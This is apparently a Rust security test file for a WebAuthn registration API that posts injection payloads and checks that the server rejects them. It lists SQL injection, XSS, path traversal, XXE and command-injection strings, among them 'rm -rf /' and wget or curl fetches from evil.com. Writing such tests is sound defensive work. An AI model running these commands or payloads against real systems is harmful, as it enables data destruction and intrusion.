//! Security tests for input validation

use actix_web::http::StatusCode;
use crate::common::{create_test_app, post_json};
use crate::fixtures::*;

#[cfg(test)]
mod input_validation_tests {
    use super::*;

    #[tokio::test]
    async fn test_sql_injection_prevention() {
        let app = create_test_app().await;

        // Test various SQL injection payloads
        let sql_injection_payloads = vec![
            ("'; DROP TABLE users; --", "SQL injection 1"),
            ("' OR '1'='1", "SQL injection 2"),
            ("admin'--", "SQL injection 3"),
            ("' UNION SELECT * FROM users --", "SQL injection 4"),
            ("'; INSERT INTO users VALUES('hacker','password'); --", "SQL injection 5"),
            ("' OR 1=1#", "SQL injection 6"),
            ("admin'/*", "SQL injection 7"),
            ("' OR 'x'='x", "SQL injection 8"),
        ];

        for (payload, description) in sql_injection_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to validation (email format)
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_xss_prevention() {
        let app = create_test_app().await;

        // Test various XSS payloads
        let xss_payloads = vec![
            ("<script>alert('xss')</script>", "XSS script tag"),
            ("<img src=x onerror=alert('xss')>", "XSS img onerror"),
            ("javascript:alert('xss')", "XSS javascript protocol"),
            ("<svg onload=alert('xss')>", "XSS SVG onload"),
            ("'><script>alert('xss')</script>", "XSS with attribute break"),
            ("<iframe src=javascript:alert('xss')>", "XSS iframe"),
            ("<body onload=alert('xss')>", "XSS body onload"),
            ("<input onfocus=alert('xss') autofocus>", "XSS autofocus"),
        ];

        for (payload, description) in xss_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.display_name = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected or handled safely
            assert!(response.status().is_client_error() || response.status().is_success(), 
                    "{} should be handled safely", description);
        }
    }

    #[tokio::test]
    async fn test_path_traversal_prevention() {
        let app = create_test_app().await;

        // Test path traversal payloads
        let path_traversal_payloads = vec![
            ("../../../etc/passwd", "Path traversal 1"),
            ("..\\..\\..\\windows\\system32\\config\\sam", "Path traversal 2"),
            ("....//....//....//etc/passwd", "Path traversal 3"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded path traversal"),
            ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoded"),
            ("/var/www/../../etc/passwd", "Absolute path with traversal"),
            ("file:///etc/passwd", "File protocol"),
        ];

        for (payload, description) in path_traversal_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to validation
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_command_injection_prevention() {
        let app = create_test_app().await;

        // Test command injection payloads
        let command_injection_payloads = vec![
            ("; ls -la", "Command injection 1"),
            ("| cat /etc/passwd", "Command injection 2"),
            ("&& rm -rf /", "Command injection 3"),
            ("`whoami`", "Command injection 4"),
            ("$(id)", "Command injection 5"),
            ("; wget http://evil.com/malware.sh", "Command injection 6"),
            ("| curl http://evil.com/steal.sh", "Command injection 7"),
            ("&& ping -c 10 127.0.0.1", "Command injection 8"),
        ];

        for (payload, description) in command_injection_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to validation
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_null_byte_injection_prevention() {
        let app = create_test_app().await;

        // Test null byte injection
        let null_byte_payloads = vec![
            ("test\x00@example.com", "Null byte in username"),
            ("User\x00Name", "Null byte in display name"),
            ("test\x00user\x00@example\x00.com", "Multiple null bytes"),
            ("\x00admin@example.com", "Null byte at start"),
            ("admin@example.com\x00", "Null byte at end"),
        ];

        for (payload, description) in null_byte_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be handled safely (rejected or processed safely)
            assert!(response.status().is_client_error() || response.status().is_success(), 
                    "{} should be handled safely", description);
        }
    }

    #[tokio::test]
    async fn test_unicode_security() {
        let app = create_test_app().await;

        // Test potentially dangerous Unicode sequences
        let unicode_payloads = vec![
            ("admin\u{feff}@example.com", "Zero-width no-break space"),
            ("admin\u{200b}@example.com", "Zero-width space"),
            ("admin\u{202e}@example.com", "Right-to-left override"),
            ("admin\u{feff}@example.com", "Byte order mark"),
            ("admin\u{2060}@example.com", "Word joiner"),
            ("admin\u{180e}@example.com", "Mongolian vowel separator"),
        ];

        for (payload, description) in unicode_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be handled safely
            assert!(response.status().is_client_error() || response.status().is_success(), 
                    "{} should be handled safely", description);
        }
    }

    #[tokio::test]
    async fn test_large_payload_prevention() {
        let app = create_test_app().await;

        // Test with extremely large payloads
        let large_payloads = vec![
            ("a".repeat(10000), "10KB payload"),
            ("a".repeat(100000), "100KB payload"),
            ("a".repeat(1000000), "1MB payload"),
        ];

        for (payload, description) in large_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload;

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to size limits
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_special_character_handling() {
        let app = create_test_app().await;

        // Test various special characters
        let special_char_payloads = vec![
            ("test!@#$%^&*()_+-=[]{}|;':\",./<>?", "Various special chars"),
            ("test\t\n\r@example.com", "Control characters"),
            ("test🚀🌟💻@example.com", "Emojis"),
            ("test「」【】@example.com", "Unicode brackets"),
            ("test'\"`~!@#$%^&*()_+-={}|[]\\:\";'<>?,./@example.com", "Many special chars"),
        ];

        for (payload, description) in special_char_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be handled safely (most will fail email validation)
            assert!(response.status().is_client_error() || response.status().is_success(), 
                    "{} should be handled safely", description);
        }
    }

    #[tokio::test]
    async fn test_format_string_injection_prevention() {
        let app = create_test_app().await;

        // Test format string injection payloads
        let format_string_payloads = vec![
            ("%s%s%s%s", "Format string 1"),
            ("%x%x%x%x", "Format string 2"),
            ("%n%n%n%n", "Format string 3"),
            ("%p%p%p%p", "Format string 4"),
            ("%d%d%d%d", "Format string 5"),
        ];

        for (payload, description) in format_string_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to email format validation
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_http_parameter_pollution() {
        let app = create_test_app().await;

        // Test HTTP parameter pollution (though our JSON parsing should handle this)
        let polluted_payloads = vec![
            ("user@example.com&user=admin@example.com", "Parameter pollution 1"),
            ("user@example.com&username=admin", "Parameter pollution 2"),
        ];

        for (payload, description) in polluted_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to email format validation
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_xml_external_entity_prevention() {
        let app = create_test_app().await;

        // Test XXE payloads (though we're using JSON, this tests input handling)
        let xxe_payloads = vec![
            ("<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>", "XXE 1"),
            ("<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "XXE 2"),
        ];

        for (payload, description) in xxe_payloads {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            // Should be rejected due to email format validation
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }

    #[tokio::test]
    async fn test_base64_validation_security() {
        // Test that base64 validation is secure
        let invalid_base64_payloads = vec![
            ("invalid+base64", "Contains +"),
            ("invalid/base64", "Contains /"),
            ("invalid=base64", "Contains ="),
            ("invalid base64", "Contains space"),
            ("invalid\tbase64", "Contains tab"),
            ("invalid\nbase64", "Contains newline"),
            ("invalid\rbase64", "Contains carriage return"),
        ];

        for (payload, description) in invalid_base64_payloads {
            // Test in attestation response
            let mut attestation = AttestationResponseFactory::valid();
            attestation.response.client_data_json = payload.to_string();

            let response = post_json(&create_test_app().await, "/attestation/result", attestation).await;
            
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected in attestation", description);
        }
    }

    #[tokio::test]
    async fn test_input_length_validation() {
        let app = create_test_app().await;

        // Test boundary conditions for input lengths
        let boundary_tests = vec![
            ("", "Empty string"),
            ("a", "Single character"),
            (&"a".repeat(64), "Maximum valid length"),
            (&"a".repeat(65), "One over maximum"),
            (&"a".repeat(1000), "Way over maximum"),
        ];

        for (payload, description) in boundary_tests {
            let mut request = RegistrationRequestFactory::valid();
            request.username = payload.to_string();

            let response = post_json(&app, "/attestation/options", request).await;
            
            if payload.len() == 0 || payload.len() > 64 {
                assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                          "{} should be rejected", description);
            } else if payload.contains("@") && payload.contains(".") {
                // Valid email format
                assert_eq!(response.status(), StatusCode::OK, 
                          "{} should be accepted", description);
            } else {
                // Invalid email format
                assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                          "{} should be rejected due to format", description);
            }
        }
    }

    #[tokio::test]
    async fn test_malformed_json_handling() {
        use actix_web::test;
        
        let app = create_test_app().await;

        // Test various malformed JSON inputs
        let malformed_json_payloads = vec![
            ("{ invalid json }", "Invalid JSON syntax"),
            ("{\"username\":}", "Missing value"),
            ("{\"username\": \"test\",}", "Trailing comma"),
            ("{\"username\": \"test\"", "Missing closing brace"),
            ("{\"username\": \"test\" extra}", "Extra data"),
            ("null", "Null JSON"),
            ("\"just a string\"", "String instead of object"),
            ("[]", "Array instead of object"),
            ("123", "Number instead of object"),
        ];

        for (payload, description) in malformed_json_payloads {
            let req = test::TestRequest::post()
                .uri("/attestation/options")
                .insert_header(("content-type", "application/json"))
                .set_payload(payload)
                .to_request();
            
            let response = test::call_service(&app, req).await;
            
            assert_eq!(response.status(), StatusCode::BAD_REQUEST, 
                      "{} should be rejected", description);
        }
    }
}